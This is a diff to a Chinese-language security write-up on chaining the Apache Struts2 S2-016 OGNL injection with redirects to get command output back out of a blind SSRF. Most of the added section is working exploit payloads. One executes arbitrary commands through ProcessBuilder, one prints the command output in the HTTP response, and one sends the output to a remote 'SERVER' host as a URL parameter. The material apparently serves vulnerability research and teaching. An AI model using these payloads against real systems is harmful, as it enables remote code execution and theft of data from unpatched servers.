@@ -63,10 +63,55 @@ Struts2漏洞的影响大家都懂的, 通过URL直接远程命令执行, 想打
 
 `/action.action?redirect:%25{3*4}`
 
-通过对连个POC的理解, 我们知道下面的POC中的redirect是实现URL跳转,通过URL跳转来验证S2-016漏洞.
+通过对连个POC的理解, 我们知道下面的POC中的redirect是实现URL跳转, 通过URL跳转来验证S2-016漏洞.
 ![Struts2-redirect](./Res/Struts2-redirect.png)
 
 当然也可以通过 "?redirect:http://www.baidu.com" 来验证. 那么我们是否可以通过 "?redirect:http://SERVER/%25{3*4}" 将%25{3*4}的执行结果作为SERVER的URL的一部分发送到远端服务器, 通过实验我们证实了这样的想法.
 ![Struts2-redirect-to-remote](./Res/Struts2-redirect-to-remote.png)
 
+下面我们尝试S2-016的命令执行POC,执行结果如下:
+
+`?redirect:%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start()}`
+
+![Struts2-exec](./Res/Struts2-exec.png)
+
+特此说明一下, 这里返回java.lang.ProcessImpl@xxxxxx表示命令执行成功, 将命令执行的结果通过redirect跳转输出到远程服务器.
+
+`?redirect:http//SERVER/%25{%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start()}`
+
+![Struts2-remote-exec](./Res/Struts2-remote-exec.png)
+
+由服务器端Access日志可以看出, 命令执行成功
+
+![Struts2-access-log](./Res/Struts2-access-log.png)
+
+其实通过上面的这种方式,我们已经完全能够准确的判断Payload Result的执行状态, 但是这不是我要的, 我想要Payload Result执行结果. 
+
+带回显的POC:
+
+`?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}`
+
+![Struts2-ssrf](./Res/Struts2-ssrf.png)
+
+将命令执行结果Redirect到远程:
+
+![Struts2-ssrf2](./Res/Struts2-ssrf2.png)
+
+我们可以看到本地浏览器可以打印出结果,但是远程Access.log不会有任何日志. 对Java懂一点点的人都知道(比如我,对Java略懂一点点), 这里的POC的作用就是本地打印,所以肯定是不行的. 下一步我们就需要更改POC , 因为对Java不熟, 为此花费了大半天的时间,写下下面的POC:
+
+`?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SERVER/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}`
+
+SERVER是我们的HTTP服务器IP地址, 我们获取命令执行结果,然后把他作为一个URL参数发送到远程SERVER上, 所以我们可以在远程SERVER的access.log看到命令的执行结果.
+
+![Struts2-ssrf3](./Res/Struts2-ssrf3.png)
+
+远程服务器日志:
+
+![Struts2-ssrf4](./Res/Struts2-ssrf4.png)
+
+至此, 我们完成了从一个BOOL型的SSRF转换为一个普通的SSRF,我们可以获取到任何Payload的执行结果, 我只能说这是一个质的飞跃.
+
+说明: 对于文中浏览器中执行的返回信息,我们仅仅是在做测试,对于BOOL型SSRF这些信息对我们是不可见的, 我们能看到的仅仅是Server端的access.log日志.
+
 #### 0x05 Other(想到什么写什么)
+
